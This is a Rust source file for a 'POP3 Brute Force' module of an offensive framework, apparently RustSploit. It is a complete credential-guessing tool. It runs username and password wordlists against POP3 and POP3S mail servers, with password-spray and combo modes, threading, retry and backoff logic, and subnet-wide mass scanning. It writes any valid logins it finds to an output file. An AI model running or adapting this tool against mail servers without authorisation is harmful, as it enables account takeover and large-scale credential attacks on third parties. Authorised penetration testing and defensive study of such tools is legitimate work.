use anyhow::{ anyhow, Context, Result };
use colored::*;
use native_tls::TlsConnector;
use std::net::IpAddr;
use std::time::Duration;

use crate::module::{ Finding, FindingKind, ModuleCtx, ModuleOutcome };
use crate::utils::{
    load_lines,
    cfg_prompt_default,
    cfg_prompt_yes_no,
    cfg_prompt_existing_file,
    cfg_prompt_int_range,
    cfg_prompt_output_file,
};
use crate::utils::{
    BruteforceConfig,
    LoginResult,
    SubnetScanConfig,
    generate_combos_mode,
    parse_combo_mode,
    load_credential_file,
    run_bruteforce,
    run_subnet_bruteforce,
    is_subnet_target,
    backoff_delay,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "POP3 Brute Force".to_string(),
        description: "Brute-force POP3 authentication with SSL/TLS support. Tests credentials against POP3 mail servers with combo mode, retry logic, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
        default_port: Some(110),
    }
}

// ============================================================================
// Error Classification
// ============================================================================

#[derive(Debug, Clone, PartialEq)]
enum Pop3ErrorType {
    AuthenticationFailed,
    ConnectionRefused,
    ConnectionTimeout,
    TlsError,
    Unknown,
}

impl Pop3ErrorType {
    /// Classify a POP3 error from its message string for smarter retry decisions.
    fn classify_error(msg: &str) -> Self {
        let lower = msg.to_lowercase();
        if lower.contains("authentication")
            || lower.contains("login")
            || lower.contains("-err")
            || lower.contains("invalid credential")
            || lower.contains("bad password")
        {
            Self::AuthenticationFailed
        } else if lower.contains("refused")
            || lower.contains("reset")
            || lower.contains("broken pipe")
        {
            Self::ConnectionRefused
        } else if lower.contains("timeout")
            || lower.contains("timed out")
            || lower.contains("deadline")
        {
            Self::ConnectionTimeout
        } else if lower.contains("tls")
            || lower.contains("ssl")
            || lower.contains("certificate")
            || lower.contains("handshake")
        {
            Self::TlsError
        } else {
            Self::Unknown
        }
    }

    /// Whether this error type is worth retrying.
    fn is_retryable(&self) -> bool {
        matches!(self, Self::ConnectionRefused | Self::ConnectionTimeout | Self::Unknown)
    }

    fn description(&self) -> &'static str {
        match self {
            Self::AuthenticationFailed => "Authentication failed",
            Self::ConnectionRefused => "Connection refused/reset",
            Self::ConnectionTimeout => "Connection timed out",
            Self::TlsError => "TLS/SSL error",
            Self::Unknown => "Unknown error",
        }
    }
}

#[derive(Debug)]
struct Pop3Error {
    error_type: Pop3ErrorType,
    message: String,
}

impl std::fmt::Display for Pop3Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "[{}] {}", self.error_type.description(), self.message)
    }
}

impl std::error::Error for Pop3Error {}

impl Pop3Error {
    fn from_anyhow(err: anyhow::Error) -> Self {
        let msg = err.to_string();
        let error_type = Pop3ErrorType::classify_error(&msg);
        Self { error_type, message: msg }
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("pop3_bruteforce requires a single-host target")?;
    crate::mprintln!("\n{}", "=== POP3 Bruteforce Module (RustSploit) ===".bold().cyan());
    crate::mprintln!();

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false).await?;
        let default_port = if use_ssl { 995 } else { 110 };
        let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "pop3_subnet_results.txt").await?;

        let connection_timeout: u64 = 5;

        let limiter = ctx.limiter.clone();
        let module_path = ctx.module_path.clone();
        run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "pop3",
            jitter_ms: 50,
            source_module: "creds/generic/pop3_credcheck",
            skip_tcp_check: false,
            state_file: None,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            let limiter = limiter.clone();
            let module_path = module_path.clone();
            async move {
                let target_str = ip.to_string();
                limiter.acquire(&module_path, &target_str).await;
                let res = tokio::task::spawn_blocking(move || {
                    attempt_pop3_login(&target_str, port, &user, &pass, use_ssl, connection_timeout)
                }).await;
                match res {
                    Ok(Ok(true)) => LoginResult::Success,
                    Ok(Ok(false)) => LoginResult::AuthFailed,
                    Ok(Err(e)) => {
                        let retryable = e.error_type.is_retryable();
                        if retryable {
                            tokio::time::sleep(backoff_delay(250, 1, 4)).await;
                        }
                        LoginResult::Error { message: e.message, retryable }
                    }
                    Err(e) => LoginResult::Error {
                        message: format!("Task panic: {}", e),
                        retryable: false,
                    },
                }
            }
        }).await?;
        return Ok(ModuleOutcome::ok());
    }

    // --- Single Target Mode ---
    let mut outcome = ModuleOutcome::ok();
    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false).await?;
    let default_port = if use_ssl { 995 } else { 110 };

    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;

    let threads = cfg_prompt_int_range("threads", "Threads", 16, 1, 256).await? as usize;
    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000).await? as u64;
    let connection_timeout = cfg_prompt_int_range("timeout", "Timeout (s)", 5, 1, 60).await? as u64;

    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;
    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", false).await?;

    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "pop3_results.txt").await?;

    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry failed connections?", true).await?;
    let max_retries = if retry_on_error {
        cfg_prompt_int_range("max_retries", "Max retries", 2, 1, 10).await? as usize
    } else {
        0
    };

    let usernames = load_lines(&username_wordlist)?;
    let passwords = load_lines(&password_wordlist)?;
    if usernames.is_empty() || passwords.is_empty() {
        anyhow::bail!("Username or password list is empty — nothing to bruteforce");
    }

    crate::mprintln!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }

    crate::mprintln!();
    crate::mprintln!("{}", "[Starting Attack]".bold().yellow());
    crate::mprintln!();

    let limiter = ctx.limiter.clone();
    let module_path = ctx.module_path.clone();
    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let limiter = limiter.clone();
        let module_path = module_path.clone();
        async move {
            limiter.acquire(&module_path, &t).await;
            let res = tokio::task::spawn_blocking(move || {
                attempt_pop3_login(&t, p, &user, &pass, use_ssl, connection_timeout)
            }).await;
            match res {
                Ok(Ok(true)) => LoginResult::Success,
                Ok(Ok(false)) => LoginResult::AuthFailed,
                Ok(Err(e)) => {
                    let retryable = e.error_type.is_retryable();
                    if retryable {
                        tokio::time::sleep(backoff_delay(250, 1, 4)).await;
                    }
                    LoginResult::Error { message: e.message, retryable }
                }
                Err(e) => LoginResult::Error {
                    message: format!("Task panic: {}", e),
                    retryable: false,
                },
            }
        }
    };

    let result = run_bruteforce(&BruteforceConfig {
        target: target.to_string(),
        port,
        concurrency: threads,
        stop_on_success,
        verbose,
        delay_ms,
        max_retries,
        service_name: "pop3",
        jitter_ms: 50,
        source_module: "creds/generic/pop3_credcheck",
    }, combos, try_login).await?;

    result.print_found();
    result.save_to_file(&output_file)?;

    for (host, user, pass) in &result.found {
        outcome.findings.push(Finding {
            target: host.clone(),
            kind: FindingKind::Credential,
            message: format!("Valid POP3 credentials found: {}:{}", user, pass),
            data: Some(serde_json::json!({
                "username": user,
                "password": pass,
                "service": "pop3",
                "port": port,
            })),
        });
    }
    Ok(outcome)
}

/// POP3 login result: Ok(true) = authenticated, Ok(false) = auth rejected, Err = classified error.
/// Shared POP3 authentication logic for both SSL and plain connections.
fn pop3_authenticate(stream: &mut (impl std::io::Read + std::io::Write), user: &str, pass: &str) -> std::result::Result<bool, Pop3Error> {
    let mut buffer = [0; 1024];
    // Read banner
    stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;

    // Send USER
    stream.write_all(format!("USER {}\r\n", user).as_bytes())
        .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    if !String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
        return Ok(false);
    }

    // Send PASS
    stream.write_all(format!("PASS {}\r\n", pass).as_bytes())
        .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
        if let Err(e) = stream.write_all(b"QUIT\r\n") { crate::meprintln!("[!] POP3 QUIT write error: {}", e); }
        if let Err(e) = stream.flush() { crate::meprintln!("[!] Flush error: {}", e); }
        return Ok(true);
    }

    Ok(false)
}

fn attempt_pop3_login(target: &str, port: u16, user: &str, pass: &str, use_ssl: bool, timeout_secs: u64) -> std::result::Result<bool, Pop3Error> {
    let addr = format!("{}:{}", target, port);
    let timeout = Duration::from_secs(timeout_secs);

    let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)
        .map_err(|e| Pop3Error::from_anyhow(e.into()))?
        .next()
        .ok_or_else(|| Pop3Error { error_type: Pop3ErrorType::ConnectionRefused, message: "Resolution failed".to_string() })?;
    let stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)
        .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    if let Err(e) = stream.set_nodelay(true) { crate::meprintln!("[!] Socket option error: {}", e); }
    stream.set_read_timeout(Some(timeout)).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    stream.set_write_timeout(Some(timeout)).map_err(|e| Pop3Error::from_anyhow(e.into()))?;

    if use_ssl {
        let connector = TlsConnector::new().map_err(|e| Pop3Error {
            error_type: Pop3ErrorType::TlsError,
            message: e.to_string(),
        })?;
        let mut tls_stream = connector.connect(target, stream).map_err(|e| Pop3Error {
            error_type: Pop3ErrorType::TlsError,
            message: e.to_string(),
        })?;
        pop3_authenticate(&mut tls_stream, user, pass)
    } else {
        let mut plain_stream = stream;
        pop3_authenticate(&mut plain_stream, user, pass)
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/pop3_bruteforce", native);
